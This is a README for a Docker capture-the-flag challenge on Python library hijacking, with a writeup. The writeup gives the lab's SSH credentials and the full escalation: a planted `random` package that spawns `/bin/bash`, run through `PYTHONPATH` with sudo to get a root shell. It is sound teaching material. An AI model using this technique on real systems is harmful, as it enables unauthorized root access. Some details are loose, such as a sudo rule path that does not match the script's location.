# Library Hijacking CTF Challenge

## 🏴 Challenge Overview
Welcome to the **Library Hijacking CTF** challenge! This is a beginner-to-intermediate level machine-based CTF where the attacker needs to escalate privileges by exploiting a misconfigured Python script that runs with root privileges.

---

## 🎯 Objective
Your goal is to gain **root access** by exploiting a Python library hijacking vulnerability. You will connect to the machine using **SSH**, enumerate the system, and escalate privileges to obtain a root shell.

---

## 🛠 Setup
This challenge runs inside a **Docker container**. To deploy it, use the following commands:
```bash
docker pull e51am/ctf
docker run -dit --name library_hijacking_ctf -p 2222:22 e51am/ctf
```

Once the container is running, you can SSH into the machine using:
```bash
ssh ctfuser@localhost -p 2222
Password: password
```

---

## 📌 Hints
- Use `sudo -l` to check for **executable scripts with sudo privileges**.
- Find out which **libraries** the vulnerable script imports.
- Hijack the **imported library** to execute arbitrary code.

---

> # Writeup

## 🔍 Enumeration & Exploitation

### 1️⃣ **Initial Access**

- The attacker discovers **credentials** for SSH login:**Username:** `ctfuser`**Password:** `password`
- Using the credentials, they connect via SSH:
    
    ```bash
    ssh ctfuser@localhost -p 2222
    
    ```
    

### 2️⃣ **Privilege Escalation - Enumerating sudo Permissions**

- Running the following command reveals a **sudo misconfiguration**:
    
    ```bash
    sudo -l
    
    ```
    
- Output:
    
    ```
    (ALL) NOPASSWD: /usr/bin/python3 vulnerable_script.py
    
    ```
    
- This means `ctfuser` can execute `vulnerable_script.py` **as root** without a password.

### 3️⃣ **Analyzing the Vulnerable Script**

- Checking the contents of `/opt/scripts/vulnerable_script.py`:**Output:**
    
    ```bash
    cat /opt/scripts/vulnerable_script.py
    
    ```
    
    ```python
    import random
    choices = ["Rock", "Paper", "Scissors"]
    computer = random.choice(choices)
    player = False
    cpu_score = 0
    player_score = 0
    while True:
      player = input("Rock, Paper or  Scissors?").capitalize()
      ## Conditions of Rock,Paper and Scissors
      if player == computer:
          print("Tie!")
      elif player == "Rock":
          if computer == "Paper":
              print("You lose!", computer, "covers", player)
              cpu_score+=1
          else:
              print("You win!", player, "smashes", computer)
              player_score+=1
      elif player == "Paper":
          if computer == "Scissors":
              print("You lose!", computer, "cut", player)
              cpu_score+=1
          else:
              print("You win!", player, "covers", computer)
              player_score+=1
      elif player == "Scissors":
          if computer == "Rock":
              print("You lose...", computer, "smashes", player)
              cpu_score+=1
          else:
              print("You win!", player, "cut", computer)
              player_score+=1
      elif player=='End':
          print("Final Scores:")
          print(f"CPU:{cpu_score}")
          print(f"Plaer:{player_score}")
          break
    
    ```
    
- The script imports **random**, which we can **hijack**!

### 4️⃣ **Exploiting Library Hijacking**

- We create a **malicious version** of `random.py` in `/tmp`:
    
    ```bash
    mkdir -p /tmp/random
    echo 'import os; os.system("/bin/bash")' > /tmp/random/__init__.py
    
    ```
    
- Set the `PYTHONPATH` to prioritize our malicious library:
    
    ```bash
    PYTHONPATH=/tmp sudo /usr/bin/python3 /opt/scripts/vulnerable_script.py
    
    ```
    
- This spawns a **root shell**! 🎉

---

## 🏆 Capture the Flag

Once you gain root access, find the flag inside:

```bash
cat /root/flag.txt

```

---

## 🚀 Conclusion
This challenge teaches **privilege escalation via Python library hijacking**, a common misconfiguration found in real-world scenarios. Happy hacking! 🏴‍☠️

---

## 📜 Disclaimer
This challenge is for **educational purposes only**. Do not attempt these techniques on unauthorized systems!

